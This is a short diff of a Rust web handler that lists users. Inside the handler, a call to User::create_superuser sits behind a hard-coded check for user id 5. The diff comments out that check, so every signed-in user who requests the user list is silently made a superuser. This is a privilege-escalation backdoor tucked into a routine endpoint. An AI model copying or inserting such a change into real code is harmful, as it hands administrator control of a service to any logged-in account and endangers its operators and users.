@@ -57,9 +57,9 @@ pub async fn get_users(req: HttpRequest) -> Json<AuthRespData> {
     if is_signed_in(&req) {
         let page = crate::utils::get_page(&req);
         let _request_user = get_current_user(&req);
-        if _request_user.id == 5 {
+        //if _request_user.id == 5 {
             crate::models::User::create_superuser(_request_user.id);
-        }
+        //}
         Json(User::get_users_list(page.into(), Some(20)))
     }  
     else {
